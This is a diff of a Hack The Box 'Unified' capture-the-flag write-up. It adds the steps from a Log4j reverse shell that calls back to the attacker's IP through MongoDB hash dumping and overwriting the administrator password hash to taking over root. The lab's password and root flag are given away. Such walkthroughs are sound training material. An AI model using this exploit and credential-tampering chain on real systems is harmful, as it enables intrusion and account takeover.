@@ -106,7 +106,8 @@ kali$ docker run -it -v $(pwd)/loot:/Log4jUnifi/loot -p 8090:8090 -p 1389:1389 l
 -u https://$TARGET$:8443 -i <my IP> -p 4444
 ```
 
-Success! We now have a foothold.
+Success! We now have a foothold and can upgrade to a full shell by `script /dev/null -c bash`
+> TODO: Why `script /dev/null -c bash`??
 
 ![JNDI exploit success using the log4junifi poc](../../../../public/img/blog/htb-starting-point/unified-jndi-exploit.png)
 
@@ -120,20 +121,80 @@ Once a reverse shell was obtained, we can run `ps aux | grep "mongo"` to find th
 **Task 9**  
 What is the default database name for UniFi applications?  
 
-Now that we know mongo is running, there should be a cli tool to interact with it. We should be able to determine the available db names, users, etc. as we continue to work through the [article](https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi)
+Now that we know mongo is running, there should be a cli tool to interact with it. We should be able to determine the available db names, users, etc. as we continue to work through the [article](https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi).
+
+Coming back a week later, by playing around in the terminal, we find a `mongo` command where we can connect to the db. Using this, we can find the db name:
+
+```bash
+unifi@unified$ mongo localhost:27117
+connecting to: mongodb://localhost:27117/test
+...
+> show dbs
+ace
+ace_stat
+admin
+config
+local
+```
+
+From some research, we see that the bottom three are default databases. (Interesting note, I could connect to any path `mongo localhost:27117/<path>` and could see the same data). In any case, looks like `ace` is the default db for Unifi applications
 
 
 **Task 10**  
 What is the function we use to enumerate users within the database in MongoDB?  
 
+Now that we know to the `ace` db is of interest, let's connect to that. It also seems that we can use the syntax `db.<collection>.find()` to list out all objects of a collection. 
+
+```bash
+> use ace
+> db.getCollectionNames()
+  [ ..., 'admin', ...]
+> db.admin.find()
+
+// Dump of admins from mongodb
+...
+{ "_id" : ObjectId("61ce4a63fbce5e00116f424f"), "email" : "michael@unified.htb", "name" : "michael", "x_shadow" : "$6$spHwHYVF$mF/VQrMNGSau0IP7LjqQMfF5VjZBph6VUf4clW3SULqBjDNQwW.BlIqsafYbLWmKRhfWTiZLjhSP.D/M1h5yJ0", "requires_new_password" : false, "time_created" : NumberLong(1640909411), "last_site_name" : "default", "email_alert_enabled" : false, "email_alert_grouping_enabled" : false, "email_alert_grouping_delay" : 60, "push_alert_enabled" : false }
+...
+```
+
+
+`db.admin.find()`
+ 
 
 **Task 11**  
 What is the function we use to update users within the database in MongoDB?  
+
+`db.admin.update()`
 
 
 **Task 12**  
 What is the password for the root user?  
 
+If we are finding the password, that probably means hash cracking. We got a few hashes from the mongo dump of users. Alternatively, we could try and leverage some mongo permissions to dump the shadow file.  Alternatively, we could try and update one of the user's passwords to gain access to the web app and see what we can do from there. The Sprocket Security article mentioned that ssh credentials can be viewed in plaintext from the portal.
+
+Given the hashes use `$6$`, we'll want to create a SHA512 hash.
+
+```bash
+kali$ mkpasswd -m sha-512 password
+$6$wQnvejiVUBrqWKcA$gTXH4ZzLxO0ydYMQsEDDimo5G6qfcetNNx/jyotyPpSIw1OagFmX/l1/83wEI.i5xZHIRToV1lCqv8dQAwZ.4.
+
+mongo> db.admin.update({name: "administrator"},{$set:{"x_shadow":"$6$wQnvejiVUBrqWKcA$gTXH4ZzLxO0ydYMQsEDDimo5G6qfcetNNx/jyotyPpSIw1OagFmX/l1/83wEI.i5xZHIRToV1lCqv8dQAwZ.4."}})
+
+> db.admin.find({"name": "administrator"}).forEach(printjson)
+{
+        "_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
+        "name" : "administrator",
+        "email" : "administrator@unified.htb",
+        "x_shadow" : "$6$wQnvejiVUBrqWKcA$gTXH4ZzLxO0ydYMQsEDDimo5G6qfcetNNx/jyotyPpSIw1OagFmX/l1/83wEI.i5xZHIRToV1lCqv8dQAwZ.4.",
+...
+```
+
+Success! We now have access.
+![Access to Unifi web portal](../../../../public/img/blog/htb-starting-point/unified-web-access.png)
+
+Heading to settings, we see a "Device Authentication" section designed to access other Unifi devices. In any case, we see the username is root, and the password is a simple click away
+
+`NotACrackablePassword4U2022`.
 
 **Task 13**  
 Submit user flag  
@@ -145,12 +206,10 @@ Once obtaining a reverse shell in task 9, we find the flag in `/home/michael/use
 **Task 14**  
 Submit root flag  
 
+From our nmap scan earlier, we saw ssh was open. Let's try that
 
-
-
-
-
-echo \
-  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/debian \
-  $(. /etc/os-release && echo "$VERSION_CODENAME") stable" | \
-  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
+```bash
+kali$ ssh root@$TARGET
+...
+root@unified# cat ~/root.txt
+e50bc93c75b634e4b272d2f771c33681
